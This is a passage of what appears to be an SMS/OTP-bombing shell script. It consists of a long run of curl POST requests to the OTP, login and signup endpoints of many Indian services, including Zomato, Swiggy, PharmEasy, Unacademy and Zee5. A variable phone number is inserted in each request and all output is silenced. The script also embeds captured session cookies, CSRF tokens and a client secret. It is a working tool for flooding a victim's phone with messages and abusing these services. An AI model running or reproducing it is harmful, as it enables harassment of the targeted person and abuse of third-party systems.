_nv_uid=173339004.1676729983.3ffe3c1c-7be0-41ad-855d-54d9c1821d4b.1676729983.1676729983.1.0; _nv_utm=173339004.1676729983.1.1.dXRtc3JjPWdvb2dsZXx1dG1jY249KG5vdCBzZXQpfHV0bWNtZD1vcmdhbmljfHV0bWN0cj0obm90IHByb3ZpZGVkKXx1dG1jY3Q9KG5vdCBzZXQpfGdjbGlkPShub3Qgc2V0KQ==; _nv_did=173339004.1676729983.10318094147tavoi; _ga_1HF6RR2VT7=GS1.1.1676729832.1.0.1676729832.0.0.0; _ga_NPGHGVF7FB=GS1.1.1676729832.1.0.1676729832.0.0.0; singular_device_id=523e24ec-85ce-4cc5-8a1d-f053dc51eb6a; AMP_TOKEN=%24NOT_FOUND; _ga=GA1.2.890613511.1676729832; _gid=GA1.2.976323208.1676729833; outbrain_cid_fetch=true; shw_13453=1; _nv_banner_x=13453; _nv_hit=173339004.1676729983.cHZpZXc9MXxidmlldz1bIjEzNDUzIl0=; AWSALBTG=DfsUbEZSlDPrsDYNT67nas897cRWx5/OVAOTdbqmdkLZtCY+2LbrDf+NEyc+CLy89gFBr5xJEfeTgAfBh75i2d8Z5RkUlEqkahbKSXC3qZzMQ+G7Npnww1qSvvMCuQKEwoUzdnXjRw+Ve4v/Js3XhY+S5a9BRyxYwfM6k965C5gJ; AWSALBTGCORS=DfsUbEZSlDPrsDYNT67nas897cRWx5/OVAOTdbqmdkLZtCY+2LbrDf+NEyc+CLy89gFBr5xJEfeTgAfBh75i2d8Z5RkUlEqkahbKSXC3qZzMQ+G7Npnww1qSvvMCuQKEwoUzdnXjRw+Ve4v/Js3XhY+S5a9BRyxYwfM6k965C5gJ; rl_session=RudderEncrypt%3AU2FsdGVkX19k1sKjNkmJ0%2BE2UJNIxhxyg8AG53dzSaIKZi0oI2Gl6DNxg66M5CAzF6LA1o3FmnDKyNgn5AwoTJVjE%2FTWnmtLhtj0Ysr2z%2B%2Bsf%2FSbHvSYHd3VJevNHij9AuM4Slxl388yg2%2BHHb82VA%3D%3D' \
  -H 'hkp-platform: Healthkartplus-0.0.1-Desktop' \
  -H 'origin: https://www.1mg.com' \
  -H 'pragma: no-cache' \
  -H 'referer: https://www.1mg.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'visitor-id: c99c0c9d-83d5-4278-c213-643112598a91_acce55_1676729979' \
  -H 'x-csrf-token: qsV9AIy4-C0GI9ppMcea042GtPQ8WRA6AhlE' \
  -H 'x-html-canrender: True' \
  -H 'x-platform: Desktop-0.0.1' \
  --data-raw '{"number":"$tor","is_corporate_user":false,"otp_on_call":true}' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://pharmeasy.in/apt-api/login/send-otp' \
  -H 'authority: pharmeasy.in' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'cookie: XdI=5_CLziIk-Z-UzV9fADhfE; XPESD=%7B%22session_id%22%3A%22s_w_5_CLziIk-Z-UzV9fADhfE_1676731430000%22%2C%22session_id_flag%22%3A%22ct_id%22%2C%22referrer%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22session_start_time%22%3A%222023-02-18T14%3A43%3A50.431Z%22%7D; XPESS_v2=s_w_5_CLziIk-Z-UzV9fADhfE_1676731430000; _gcl_au=1.1.94281476.1676731432; dtm_token_sc=AQEKjT3XGJoDGwEh4rcaAQEBAQA; _gid=GA1.2.1474380513.1676731432; _gat_UA-60621013-1=1; dtm_token=AQEKjT3XGJoDGwEh4rcaAQEBAQA; _ga=GA1.1.600542235.1676731432; _ga_J4XE9SW84F=GS1.1.1676731432.1.1.1676731432.60.0.0; WZRK_G=49b7952d33c54ae6bf2925d2721b665e; _fbp=fb.1.1676731437921.460723146; WZRK_S_R9Z-WWR-854Z=%7B%22p%22%3A1%2C%22s%22%3A1676731584%2C%22t%22%3A1676731437%7D' \
  -H 'origin: https://pharmeasy.in' \
  -H 'referer: https://pharmeasy.in/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'x-instana-l: 1,correlationType=web;correlationId=b93fcd3cc87cdd26' \
  -H 'x-instana-s: b93fcd3cc87cdd26' \
  -H 'x-instana-t: b93fcd3cc87cdd26' \
  --data-raw '{"param":"$tor"}' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://accounts.zomato.com/login/phone' \
  -H 'authority: accounts.zomato.com' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: multipart/form-data; boundary=----WebKitFormBoundarywon1ZNqyBEuGcv9i' \
  -H 'cookie: rd=1380000; fbtrack=61e3f87311ceecc9d51e2609faf532f1; cid=2c4e3ed9-0308-4d16-a237-3a5c99f7e944; zrt_3a5c99f7e944=eO67ep2-SBpSkWDTtqcPxOVx2eoWE8NpZ9igsi2TbDI.ZgB1LGAzmKZCJFwhRRyu-SKzDgMEND8j8bbQnmI3OwU; zat=sOCx2rpxJpp5delkrapgQgYKk_ZW_Ilz0bTusLUeLUU.o-BHYolzen5s_0T_jG23j3M57YF_w7mhmhlwkkQOHT4; ttaz=1663499912; hy-en=1; _gcl_au=1.1.1729039832.1672581174; _fbp=fb.1.1672581174162.1631487211; expab=1; dpr=2; PHPSESSID=16833d13b04bd8ec107b5283d62b8717; csrf=aaa1e77cff99a5e93f1391bb9f43e0db; fbcity=1; zl=en; ak_bmsc=3EAF980831A5985B7748B265C5CED218~000000000000000000000000000000~YAAQzmPUF2t5b1yGAQAAdlMDZRLknGL5g7QNDgh0GbldbQ8cb542mTpbWQCB+mChZLBYRLLJNZs51H+1M1KE2GXopSOueCosdf8urUKAVKZjtLZ8DqhuXboFiRlhP608TCy5v5y2Xhj4oCZJfKHCEltmg6XUHOxqjfeUFaQm0QsJm7+fC5WIquiAR8I03hG6rHlOmhf3ufcXgtJhtNN1gJZ/a03ZIrudWX7dm/8UVwQ4aMNCHyo9LbNGcozTTpfAC0aDEwucSrd45pt/NW+FI9M4DZTSYXnG26PFWTZFm6WkIekkJtdUDuKBddb/KbGTuJwFIa91/EDQ9qVa1+wzA9EKMfY1jWFTG8gLYnC1CBTTRlPtYG+zMunAkeY2CRtJoGkV6+XZu9KvGeY=; _gid=GA1.2.440842435.1676731812; _gat_global=1; _gat_city=1; _gat_country=1; fre=0; _ga_2XVFHLPTVP=GS1.1.1676731813.5.0.1676731813.0.0.0; _ga=GA1.1.222442728.1660907299; oauth2_authentication_csrf=MTY3NjczMTk3M3xEdi1CQkFFQ180SUFBUkFCRUFBQVB2LUNBQUVHYzNSeWFXNW5EQVlBQkdOemNtWUdjM1J5YVc1bkRDSUFJR1ZsTm1KaVpXTmxaV1psT0RRM056QmhZelEyWmpGallXWXlOek0wWlRjMHxI0Ofs9pAz-DPtkW-8Tilflw8uYqs7Jb8WO0MwJOacVQ==; AKA_A2=A; zxcv=4436767029ba2b5dffc404c9318bffc28845125f949dfc1c5a8fecab; cid=2c4e3ed9-0308-4d16-a237-3a5c99f7e944; purl=https://www.zomato.com; callback=; G_ENABLED_IDPS=google' \
  -H 'origin: https://accounts.zomato.com' \
  -H 'referer: https://accounts.zomato.com/zoauth/login?login_challenge=400c6068d99947e6a3f5c8245e627cf9' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'x-zomato-csrft;' \
  --data-raw $'------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="country_id"\r\n\r\n1\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="number"\r\n\r\n$tor\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="type"\r\n\r\ninitiate\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="hash"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="id_token"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="fb_token"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="email"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="name"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="otp"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="csrf_token"\r\n\r\naaa1e77cff99a5e93f1391bb9f43e0db\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="lc"\r\n\r\n400c6068d99947e6a3f5c8245e627cf9\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="verification_type"\r\n\r\nsms\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="message_uuid"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="theme"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i--\r\n' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://www.swiggy.com/dapi/auth/sms-otp' \
  -H 'authority: www.swiggy.com' \
  -H '__fetch_req__: true' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'cookie: __SW=CYag00bMdyySC1m1woD1g9iuNA2Q3Gk-; _guest_tid=6c10abe9-1bc3-4daf-860d-e3eeca404c5c; _is_logged_in=; _device_id=1d6990ec-bd7e-2d03-ca19-9b7a378b72cc; _sid=5h87f6bd-f62d-4a98-8fc4-68434252c9cf; fontsLoaded=1; _gcl_au=1.1.2129486398.1676731979; _gid=GA1.2.2119851383.1676731980; _gat_0=1; WZRK_G=9944d0f57cc04d649846794fa9f1e233; _ga=GA1.1.1616598371.1676731980; WZRK_S_W86-ZZK-WR6Z=%7B%22p%22%3A1%2C%22s%22%3A1676732131%2C%22t%22%3A1676731980%7D; _ga_34JYJ0BCRN=GS1.1.1676731980.1.1.1676731994.0.0.0' \
  -H 'origin: https://www.swiggy.com' \
  -H 'referer: https://www.swiggy.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  --data-raw '{"mobile":"$tor","_csrf":"4QfCUHREQUpv-blC01cQBRzTY41dSeJGH30alxjQ"}' \
  --compressed  > /dev/null 2>&1



curl -X POST 'https://mtnucleus.byjusweb.com/api/acs/v2/send-otp' \
  -H 'authority: mtnucleus.byjusweb.com' \
  -H 'accept: application/json, text/javascript, */*; q=0.01' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'origin: https://byjus.com' \
  -H 'referer: https://byjus.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: cross-site' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  --data-raw '{"phoneNumber":"$tor","page":"free-trial-classes"}' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://api.sso.masaischool.com/mobile-signup-send-otp' \
  -H 'authority: api.sso.masaischool.com' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'cookie: _hjSessionUser_2119938=eyJpZCI6ImFjY2M4MzRlLTRmMmEtNTYwOS1hYzc4LWZhYmM2NDAyZDdkMSIsImNyZWF0ZWQiOjE2NTcyMTczODgwODUsImV4aXN0aW5nIjp0cnVlfQ==; _gcl_au=1.1.1376926357.1676732482; _gid=GA1.2.1311796423.1676732483; _gat_UA-143003758-1=1; WZRK_S_6XL-S15-SL8A=%7B%22p%22%3A1%7D; _fbp=fb.1.1676732484196.929525330; _ga=GA1.3.1968225207.1676732483; _gid=GA1.3.1311796423.1676732483; _ga=GA1.2.1968225207.1676732483; _ga_1T4T8PN99C=GS1.1.1676732484.1.1.1676732487.0.0.0; _ga_GPPD2PTVSL=GS1.1.1676732482.1.1.1676732515.27.0.0' \
  -H 'origin: https://sso.masaischool.com' \
  -H 'referer: https://sso.masaischool.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  --data-raw '{"mobileNumber":"+91$tor","name":"kalwar"}' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://unacademy.com/api/v3/user/user_check/?enable-email=true' \
  -H 'authority: unacademy.com' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'cookie: isDarkModeOn=; proxy-user-uid=856546e5_d94d_4c92_b2ea_50601b466977; un_session_id=738747f0_073b_4eb6_b3b7_5f1fbb258522; ajs_anonymous_id=29f31176_c196_4600_86e7_6b6880e7ea35; anonymous_session_id=aeaeefcf_bd1f_46e6_848d_0eea5f87a8f8; _gcl_au=1.1.721686470.1676749491; __gtm_referrer=https%3A%2F%2Fwww.google.com%2F; _gid=GA1.2.1865436011.1676749491; _gat_UA-69016858-2=1; _gat_UA-5306665-19=1; _ga=GA1.2.387904297.1676749491; _fbp=fb.1.1676749491677.513529990; _ga_6JX23YC5TQ=GS1.1.1676749491.1.0.1676749493.0.0.0; ajs_anonymous_id=29f31176_c196_4600_86e7_6b6880e7ea35; _uetsid=b7bec9f0afc411edb8fcf3e5b0242a00; _uetvid=bd557650d54211ecab6383e5aece31d2' \
  -H 'origin: https://unacademy.com' \
  -H 'referer: https://unacademy.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'x-platform: 0' \
  --data-raw '{"phone":"$tor","country_code":"IN","otp_type":1,"email":"","send_otp":true,"is_un_teach_user":false}' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://unacademy.com/api/v3/user/user_check/?enable-email=true' \
  -H 'authority: unacademy.com' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'cookie: isDarkModeOn=; proxy-user-uid=856546e5_d94d_4c92_b2ea_50601b466977; un_session_id=738747f0_073b_4eb6_b3b7_5f1fbb258522; ajs_anonymous_id=29f31176_c196_4600_86e7_6b6880e7ea35; anonymous_session_id=aeaeefcf_bd1f_46e6_848d_0eea5f87a8f8; _gcl_au=1.1.721686470.1676749491; __gtm_referrer=https%3A%2F%2Fwww.google.com%2F; _gid=GA1.2.1865436011.1676749491; _ga=GA1.2.387904297.1676749491; _fbp=fb.1.1676749491677.513529990; ajs_anonymous_id=29f31176_c196_4600_86e7_6b6880e7ea35; _ga_6JX23YC5TQ=GS1.1.1676749491.1.1.1676749507.0.0.0; _uetsid=b7bec9f0afc411edb8fcf3e5b0242a00; _uetvid=bd557650d54211ecab6383e5aece31d2' \
  -H 'origin: https://unacademy.com' \
  -H 'referer: https://unacademy.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'x-platform: 0' \
  --data-raw '{"phone":"$tor","country_code":"IN","otp_type":2,"email":"","send_otp":true,"is_un_teach_user":false}' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'client-version: 1819' \
  -H 'Authorization: Bearer' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'Referer: https://www.pw.live/' \
  -H 'randomId: 9242fe67-d24e-4fb1-8859-3d726e2471e3' \
  -H 'client-id: 5eb393ee95fab7468a79d189' \
  -H 'client-type: WEB' \
  -H 'sec-ch-ua-platform: "Windows"' \
  --data-raw '{"mobile":"$tor","countryCode":"+91","firstName":"cxvzv"}' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://api.penpencil.co/v1/users/resend-otp?smsType=1' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'client-version: 1819' \
  -H 'Authorization: Bearer' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'Referer: https://www.pw.live/' \
  -H 'randomId: 9242fe67-d24e-4fb1-8859-3d726e2471e3' \
  -H 'client-id: 5eb393ee95fab7468a79d189' \
  -H 'Client-Type: WEB' \
  -H 'sec-ch-ua-platform: "Windows"' \
  --data-raw '{"mobile":"$tor","organizationId":"5eb393ee95fab7468a79d189"}' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone' \
  -H 'authority: prod-auth-api.upgrad.com' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json;charset=UTF-8' \
  -H 'course;' \
  -H 'origin: https://www.upgrad.com' \
  -H 'referer: https://www.upgrad.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'utm_campaign;' \
  -H 'utm_content;' \
  -H 'utm_medium;' \
  -H 'utm_source;' \
  -H 'utm_term;' \
  --data-raw '{"phoneNumber":"+91$tor"}' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://user.vedantu.com/user/preLoginVerification' \
  -H 'authority: user.vedantu.com' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'cookie: LAST_SOURCE_UTMS={"utm_campaign":null,"utm_source":"google","utm_medium":"organic","utm_term":null,"utm_content":null}; FIRST_SOURCE_UTMS={"utm_campaign":null,"utm_source":"google","utm_medium":"organic","utm_term":null,"utm_content":null}; _gcl_au=1.1.1801421064.1676750632; _fbp=fb.1.1676750632305.1786532008; _uetsid=5dd410e0afc711ed929ef378d04704a5; _uetvid=5dd46fc0afc711eda0a1b549c8b1edc2; amp_832ba5=URKj3Eld2ax5kQvoBaAYiX...1gpj20d24.1gpj20ebf.3.0.3; _ga_35N6JBZRVC=GS1.1.1676750632.1.0.1676750633.59.0.0; _ga=GA1.2.569150463.1676750633; _gid=GA1.2.1152042693.1676750634; amp_832ba5_vedantu.com=URKj3Eld2ax5kQvoBaAYiX...1gpj20d24.1gpj20ggs.4.0.4; auth-token=8Hq63zA7QQVD8MmU' \
  -H 'origin: https://www.vedantu.com' \
  -H 'referer: https://www.vedantu.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  --data-raw '{"email":null,"phoneCode":"+91","phoneNumber":"$tor","version":2,"ver":"12.336"}' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://api.doubtnut.com/v4/student/login' \
  -H 'authority: api.doubtnut.com' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/x-www-form-urlencoded' \
  -H 'origin: https://www.doubtnut.com' \
  -H 'referer: https://www.doubtnut.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'version_code: 1500' \
  --data-raw 'phone_number=$tor&is_web=3' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://api.tatadigital.com/api/v2/sso/check-phone' \
  -H 'authority: api.tatadigital.com' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'client_id: TATACLIQ-WEB-APP' \
  -H 'client_secret: 43592fac-5bcf-48eb-bf39-db6cf608a039' \
  -H 'content-type: application/json' \
  -H 'isabsoluteurl: true' \
  -H 'origin: https://www.tatacliq.com' \
  -H 'referer: https://www.tatacliq.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: cross-site' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  --data-raw '{"countryCode":"91","phone":"$tor","sendOtp":true}' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://auth.zee5.com/v1/user/sendotp' \
  -H 'Accept: application/json' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/json' \
  -H 'Origin: https://www.zee5.com' \
  -H 'Referer: https://www.zee5.com/' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: same-site' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'device_id: 0afpDz7hZuUJl38J9bWD000000000000' \
  -H 'esk: MGFmcER6N2hadVVKbDM4SjliV0QwMDAwMDAwMDAwMDBfX2dCUWFaTGlOZEdOOVVzQ0taYWxvZ2h6OXQ5U3RXTFNEX18xNjc2NzU1NDI1ODI3' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  --data-raw '{"phoneno":"91$tor"}' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://www.dunzo.com/api/v0/auth/sign-up' \
  -H 'authority: www.dunzo.com' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json;charset=UTF-8' \
  -H 'cookie: dz_e=YTAzOWIzNjMtNDU2MC00NDI1LWJjMjMtNDU5NTM4NTZkOGEwX3Yx; connect.sid=s%3AJ-kk0fo5a3k_5q21n9c1bP03KbvEqEYm.BnId9YBG52aj3D5X7S4bkTK99V0LgRFjrv7y3kBlfAc; _gcl_au=1.1.280736843.1676728602; _gid=GA1.2.1103936861.1676728602; WZRK_G=438a8b6b3354443d8c4b2533883f6ebf; _fbp=fb.1.1676728602565.1956882044; __cf_bm=bSeV_LBqdbJamEYB6Dcv8XtnyO.sMTiA9B4z9qwWmho-1676762323-0-AQyYz/u5BhdtVYzbIRXt9gsAcnrc5kP7v3IXfwTQ/hEoaEarkiULYPjsqKxBMTD1AR5CrDIy35erR1EfTFwgfxI=; __cfruid=6dbb5c76baae2a6cc72f7216b2b1a1b3aed91b29-1676762323; _gat_UA-74154936-4=1; _ga=GA1.1.563334689.1676728602; _ga_MH9JSX933B=GS1.1.1676762173.2.0.1676762173.0.0.0; WZRK_S_46R-KR9-WZ5Z=%7B%22p%22%3A1%2C%22s%22%3A1676762324%2C%22t%22%3A1676762194%7D' \
  -H 'correlation-id: 4d805880afe211ed8f1797d73bb0a42f' \
  -H 'origin: https://www.dunzo.com' \
  -H 'referer: https://www.dunzo.com/delhi' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'x-app-flavour;' \
  -H 'x-app-type: PWA_WEB' \
  -H 'x-app-version: 2.0.0' \
  -H 'x-csrf-token: MCVoy4ET-I18Jva1CJx9lZyB82ZzZ_KwYEoU' \
  --data-raw '{"phone":"$tor","tos_accepted":true}' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://unacademy.com/api/v3/user/user_check/?enable-email=true' \
  -H 'authority: unacademy.com' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'cookie: isDarkModeOn=; proxy-user-uid=856546e5_d94d_4c92_b2ea_50601b466977; un_session_id=738747f0_073b_4eb6_b3b7_5f1fbb258522; ajs_anonymous_id=29f31176_c196_4600_86e7_6b6880e7ea35; anonymous_session_id=aeaeefcf_bd1f_46e6_848d_0eea5f87a8f8; _gcl_au=1.1.721686470.1676749491; __gtm_referrer=https%3A%2F%2Fwww.google.com%2F; _gid=GA1.2.1865436011.1676749491; _gat_UA-69016858-2=1; _gat_UA-5306665-19=1; _ga=GA1.2.387904297.1676749491; _fbp=fb.1.1676749491677.513529990; _ga_6JX23YC5TQ=GS1.1.1676749491.1.0.1676749493.0.0.0; ajs_anonymous_id=29f31176_c196_4600_86e7_6b6880e7ea35; _uetsid=b7bec9f0afc411edb8fcf3e5b0242a00; _uetvid=bd557650d54211ecab6383e5aece31d2' \
  -H 'origin: https://unacademy.com' \
  -H 'referer: https://unacademy.com/' \
